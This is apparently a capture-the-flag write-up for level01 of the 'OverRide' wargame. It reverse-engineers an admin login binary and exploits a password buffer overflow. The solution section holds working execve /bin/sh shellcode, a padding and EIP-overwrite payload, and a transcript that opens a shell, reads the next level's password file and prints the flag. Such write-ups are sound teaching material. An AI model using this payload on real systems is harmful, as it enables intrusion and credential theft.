
### notes
```c
0x080484d0  main : function
0x08048464  verify_user_name : function
0x080484a3  verify_user_pass : function
0x0804a040  a_user_name : global var
```

### 0x08048529 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    int argc = ebp+0x8
    char **argv = ebp+12

    char *buffer1 = esp+28
    char *buffer2 = esp+92

    0x60 ... 96
    0x1c ... 28
    0x5c ... 92
    0x100 ... 256
    0x64 ... 100

}
```
* __`<0> ➜ <+8> : prepare stack frame for n function with size 160`__
```c
0x080484d0 <+0>:	push   ebp
0x080484d1 <+1>:	mov    ebp,esp
0x080484d3 <+3>:	push   edi
0x080484d4 <+4>:	push   ebx
0x080484d5 <+5>:	and    esp,0xfffffff0
0x080484d8 <+8>:	sub    esp,96
```
* __`<+11> ➜ <+29> : fill the block of memory of buffer1 with 64 bytes of 0s`__
```c
0x080484db <+11>:	lea    ebx,[buffer1]
0x080484df <+15>:	mov    eax,0
0x080484e4 <+20>:	mov    edx,16
0x080484e9 <+25>:	mov    edi,ebx
0x080484eb <+27>:	mov    ecx,edx
0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
buffer1 = memset(buffer1, 0, 64);
```
* __`<+31> ➜ <+46> : simple put to screen`__
```c
0x080484ef <+31>:	mov    DWORD PTR [buffer2],0
0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8 // "********* ADMIN LOGIN PROMPT *********"
0x080484fe <+46>:	call   0x8048380 <puts@plt>
puts("********* ADMIN LOGIN PROMPT *********");
```
* __`<+51> ➜ <+88> : get username value from user with fgets and save it into a_user_name`__
```c
0x08048503 <+51>:	mov    eax,0x80486df // "Enter Username: "
0x08048508 <+56>:	mov    DWORD PTR [esp],eax
0x0804850b <+59>:	call   0x8048360 <printf@plt>
0x08048510 <+64>:	mov    eax,ds:stdin
0x08048515 <+69>:	mov    DWORD PTR [esp+8],eax
0x08048519 <+73>:	mov    DWORD PTR [esp+4],256
0x08048521 <+81>:	mov    DWORD PTR [esp],a_user_name
0x08048528 <+88>:	call   0x8048370 <fgets@plt>
printf("Enter Username: ");
fgets(a_user_name, 256, stdin);
```
* __`<+93> ➜ <+126> : verify if username is valid with a function`__
```c
0x0804852d <+93>:	call   0x8048464 <verify_user_name>
0x08048532 <+98>:	mov    DWORD PTR [buffer2],eax
0x08048536 <+102>:	cmp    DWORD PTR [buffer2],0
0x0804853b <+107>:	je     0x8048550 <main+128>
0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0 // "nope, incorrect username...\n"
0x08048544 <+116>:	call   0x8048380 <puts@plt>
0x08048549 <+121>:	mov    eax,0x1
0x0804854e <+126>:	jmp    0x80485af <main+223>
if (verify_user_name() != 0)
    puts("nope, incorrect username...\n");
    jump to return(1) 
```
* __`<+128> ➜ <+>164 : takes password from user by reading 99 bytes from user and save it into psswd buffer of size of 64 bytes (the prob is here)`__
```c
0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d // "Enter Password: "
0x08048557 <+135>:	call   0x8048380 <puts@plt>
0x0804855c <+140>:	mov    eax,ds:stdin
0x08048561 <+145>:	mov    DWORD PTR [esp+8],eax
0x08048565 <+149>:	mov    DWORD PTR [esp+4],100
0x0804856d <+157>:	lea    eax,[buffer1]
0x08048571 <+161>:	mov    DWORD PTR [esp],eax
0x08048574 <+164>:	call   0x8048370 <fgets@plt>
puts("Enter Password: ");
fgets(buffer1, 100, stdin);
```
* __`<+169> ➜ <+176> : eax = address of buffer1; call verify_user_pass with address of buffer1 as argument; and put return value in eax`__
* __`<+181> ➜ <+190> : buffer2 = eax; if (buffer2 == 0) { jump to main+199 }`__
* __`<+192> ➜ <+197> : if (buffer2 == 0) { jump to main+218 }`__
* __`<+199> ➜ <+206> : print "nope, incorrect password...\n" to screen`__
```c
0x08048579 <+169>:	lea    eax,[buffer1]
0x0804857d <+173>:	mov    DWORD PTR [esp],eax
0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
0x08048585 <+181>:	mov    DWORD PTR [buffer2],eax
0x08048589 <+185>:	cmp    DWORD PTR [buffer2],0
0x0804858e <+190>:	je     0x8048597 <main+199>
0x08048590 <+192>:	cmp    DWORD PTR [buffer2],0
0x08048595 <+197>:	je     0x80485aa <main+218>
0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
0x0804859e <+206>:	call   0x8048380 <puts@plt>

buffer2 = verify_user_pass(buffer);
if (buffer2 == 0) {
    puts("nope, incorrect password...\n");
    jump to return (1)
}

if (buffer2 == 0) {
    jump to return (0)
}

puts("nope, incorrect password...\n");
```
* __`<+211> ➜ <+216> : eax = 1; return(eax)`__
* __`<+218> ➜ <+229> : eax = 0; return(eax)`__
```c
0x080485a3 <+211>:	mov    eax,1
0x080485a8 <+216>:	jmp    0x80485af <main+223>
0x080485aa <+218>:	mov    eax,0
0x080485af <+223>:	lea    esp,[ebp-0x8]
0x080485b2 <+226>:	pop    ebx
0x080485b3 <+227>:	pop    edi
0x080485b4 <+228>:	pop    ebp
0x080485b5 <+229>:	ret
return (1)
```
---

### 0x08048464 : verify_user_name() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    0x10 ... 16
}
```
* __`<0> ➜ <+5> : prepare stack frame for verify_user_name function with size 16`__
```c
0x08048464 <+0>:	push   ebp
0x08048465 <+1>:	mov    ebp,esp
0x08048467 <+3>:	push   edi
0x08048468 <+4>:	push   esi
0x08048469 <+5>:	sub    esp,16
```
* __`<+8> ➜ <+15> : print to screen a message`__
```c
0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690 // "verifying username....\n"
0x08048473 <+15>:	call   0x8048380 <puts@plt>
puts("verifying username....\n");
```
* __`<+20> ➜ <+53> : compare value in global variable (a_user_name) to "dat_will and put value of comparison in eax"`__
```c
0x08048478 <+20>:	mov    edx,0x804a040 //  <a_user_name>
0x0804847d <+25>:	mov    eax,0x80486a8 // "dat_wil"
0x08048482 <+30>:	mov    ecx,7
0x08048487 <+35>:	mov    esi,edx
0x08048489 <+37>:	mov    edi,eax
0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
0x0804848d <+41>:	seta   dl
0x08048490 <+44>:	setb   al
0x08048493 <+47>:	mov    ecx,edx
0x08048495 <+49>:	sub    cl,al
0x08048497 <+51>:	mov    eax,ecx
0x08048499 <+53>:	movsx  eax,al
eax = strcmp(a_user_name, "dat_wil");
```
* __`<+56> ➜ <+62> : return eax`__
```c
0x0804849c <+56>:	add    esp,16
0x0804849f <+59>:	pop    esi
0x080484a0 <+60>:	pop    edi
0x080484a1 <+61>:	pop    ebp
0x080484a2 <+62>:	ret    
reurn(eax)
```
### 0x080484a3 : verify_user_pass(password) : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    password = ebp+0x8
}
```
* __`<+0> ➜ <+4> : push ebp to stack and, then ebp is pointing to esp, and push edi/esi to stack also`__
```c
0x080484a3 <+0>:	push   ebp
0x080484a4 <+1>:	mov    ebp,esp
0x080484a6 <+3>:	push   edi
0x080484a7 <+4>:	push   esi
```
* __`<+5> ➜ <+38> : reqz cmps equivalent to strcmp(), compare password content to the word "admin"`__
```c
0x080484a8 <+5>:	mov    eax,DWORD PTR [password]
0x080484ab <+8>:	mov    edx,eax
0x080484ad <+10>:	mov    eax,0x80486b0 // "admin"
0x080484b2 <+15>:	mov    ecx,5
0x080484b7 <+20>:	mov    esi,edx
0x080484b9 <+22>:	mov    edi,eax
0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
0x080484bd <+26>:	seta   dl
0x080484c0 <+29>:	setb   al
0x080484c3 <+32>:	mov    ecx,edx
0x080484c5 <+34>:	sub    cl,al
0x080484c7 <+36>:	mov    eax,ecx
0x080484c9 <+38>:	movsx  eax,al
```
* __`<+41> ➜ <+44> : retreive values of esi,edi,ebp`__
```c
0x080484cc <+41>:	pop    esi
0x080484cd <+42>:	pop    edi
0x080484ce <+43>:	pop    ebp
0x080484cf <+44>:	ret    
```

---

### Code Prediction 
```c
a_user_name = "";

int verify_user_name() {
    return (strcmp(a_user_name, "dat_wil"));
}

int verify_user_pass(psswd) {
    return (strcmp(psswd, "admin"));
}

int main(int argc(ebp+0x8), char **argv(ebp+12)) {
    char *password = esp+28
    char *isValid = esp+92

    password = memset(0, 64);

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);
    if (verify_user_name() != 0)
    {
        puts("nope, incorrect username...\n");
        return(1) 
    }
    puts("Enter Password: ");
    fgets(password, 100, stdin);
    isValid = verify_user_pass(password);

    if (isValid == 0) {
        puts("nope, incorrect password...\n");
        return(1);
    }
    
    if (isValid == 0) {
        return (0)
    }

    puts("nope, incorrect password...\n");
    return (1);
}

```

----

### Stack Illustration
```c
+-------------------+ 
[      **argv       ]
+-------------------+ +12
[        argc       ]
+-------------------+ +8
[ret addr (OLD_EIP) ]
+-------------------+ +4
[      OLD_EBP      ]
+-------------------+ <---EBP
[and esp,0xfffffff0 ] <--- stack alignement 
+-------------------+ +96
[                   ]     <------+ isValid bufffer (4 bytes)
+-------------------+ +92 <------+
[  end of password  ]            |
+-------------------+ +88        |
          *                      |
          *                      | 
          *                      | password buffer (64 bytes)
+-------------------+ +32        |
[ start of password ]            |
+-------------------+ +28 <------+
[                   ]
+-------------------+ +24
          *
          *
          *
+-------------------+ +8
[                   ] 
+-------------------+ +4
[ (esp+28)password  ]
+-------------------+ <---ESP
```
---
### Process of the Exploit
- the program takes two inputs:
1. **username** : and compare it with **dat_will** then asks for password if valid
1. **password** : takes any password, doesnt matter what and print "incorrect password"
- the problem is that the password taken from user is saved into a buffer with 
    >fgets(password, 100, stdin);

    knowing that password is only 64 bytes length [**memset(0, 64)**]
    so clearly we have a vulnerability of buffer overflow in this buffer (password buffer)

- the idea of the exploit is clear :
    1. find the offset of overflow in passwd input
    1. inject our shellcode in that buffer
    1. overwrite EIP address to point to the start of that buffer which will be containing Shellcode
- **find the offset of buffer overflow :**   
```txt
(gdb) run 
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_will
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () <------------------------------------= offset : 80
(gdb)
```
- **Prepare the payload**:
>username : dat_will
>password : SHELLCODE(21 bytes) + PADDING (59 bytes) + NEW_EIP (4 bytes)

---
### Solution :

```shell
level01@OverRide:~$     (python -c 'print "dat_will"'; python -c 'print  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"  + "P" * 59 + "\xff\xff\xd5\xec"[::-1]'; cat -)  | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

pwd
/home/users/level01
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

**`flag : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`**

---

### Ressources :
N/A